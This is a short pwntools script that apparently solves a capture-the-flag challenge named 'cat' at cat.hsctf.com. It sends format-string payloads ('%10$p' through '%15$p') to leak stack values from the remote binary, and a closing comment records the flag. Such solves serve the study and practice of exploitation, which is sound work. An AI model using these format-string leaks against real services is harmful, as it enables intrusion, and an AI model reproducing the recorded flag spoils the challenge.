
# -- coding: utf-8 --
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
# ENV
e = context.binary = ELF('./cat')
lib = e.libc
# r = e.process()
r=remote("cat.hsctf.com", 1337)

# VARIABLE
flag=0x4011D2
# payload
pause()

r.sendline(b"%10$p%11$p%12$p")
r.sendline(b"%13$p%14$p%15$p")


r.interactive()

# flag{real_programmers_use_butterflies}